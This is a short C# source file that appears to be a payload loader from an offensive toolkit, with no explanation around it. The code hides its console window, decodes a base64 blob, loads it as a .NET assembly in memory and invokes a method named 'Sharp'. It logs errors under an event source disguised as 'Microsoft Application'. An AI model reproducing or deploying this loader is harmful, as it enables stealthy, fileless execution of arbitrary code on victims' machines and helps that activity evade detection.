using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Diagnostics;

public class Program
{
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public static void RunCS(string cmd)
    {
        IntPtr consoleWindow = Program.GetConsoleWindow();
        Program.ShowWindow(consoleWindow, 0);
        try
        {
            byte[] x = System.Convert.FromBase64String(cmd);
            Assembly assembly = System.Reflection.Assembly.Load(x);
            assembly.GetType("Program").InvokeMember("Sharp", BindingFlags.InvokeMethod, null, null, null);
        }
        catch (Exception e) {
            string source = "Microsoft Application";
            string log = "Application";
            if (!EventLog.SourceExists(source))
            {
                EventLog.CreateEventSource(source, log);
            }
            EventLog.WriteEntry(source, "Error: "+e, EventLogEntryType.Warning);

        }
    }
}
